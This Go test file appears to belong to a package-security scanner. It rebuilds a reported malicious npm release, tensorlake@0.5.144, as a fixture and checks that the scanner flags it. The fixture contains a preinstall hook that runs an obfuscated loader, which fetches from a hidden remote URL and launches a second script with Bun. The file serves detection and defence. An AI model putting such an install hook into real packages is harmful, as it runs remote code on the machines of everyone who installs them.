package intelligence

import "testing"

// Tensorlake SDK (row 58): tensorlake@0.5.144 added "preinstall": "node
// lib/setup.mjs"; Socket describes lib/setup.mjs as obfuscated (it launches
// lib/Math_Symbol.js with Bun) — the ChainDrop toolkit. An _0x-obfuscated
// loader escalates on the first hop.
func TestAttack2026_58_Tensorlake_ByteScan(t *testing.T) {
	loader := atkBObfuscatedJS("const {execFileSync}=require('node:child_process');" +
		"require('node:https').get(_0x1b2c('0x0'),r=>{});execFileSync('bun',[__dirname+'/Math_Symbol.js']);\n")
	p := newInstallScriptsProvider()
	bad := atkBRun(t, p, "tensorlake", "0.5.144", atkBTarball(t, map[string]string{
		"package.json":       `{"name":"tensorlake","version":"0.5.144","main":"lib/index.js","scripts":{"preinstall":"node lib/setup.mjs"}}`,
		"lib/index.js":       "module.exports={};\n",
		"lib/setup.mjs":      loader,
		"lib/Math_Symbol.js": "// @bun @bun-cjs\n",
	}))
	if !bad.InstallScriptFetches {
		t.Fatalf("tensorlake@0.5.144: want fetches_remote, got %+v", bad)
	}
	clean := atkBRun(t, p, "tensorlake", "0.5.143", atkBTarball(t, map[string]string{
		"package.json": `{"name":"tensorlake","version":"0.5.143","main":"lib/index.js"}`,
		"lib/index.js": "module.exports={};\n",
	}))
	if clean.HasInstallScript || clean.InstallScriptFetches {
		t.Fatalf("tensorlake@0.5.143 flagged: %+v", clean)
	}
}
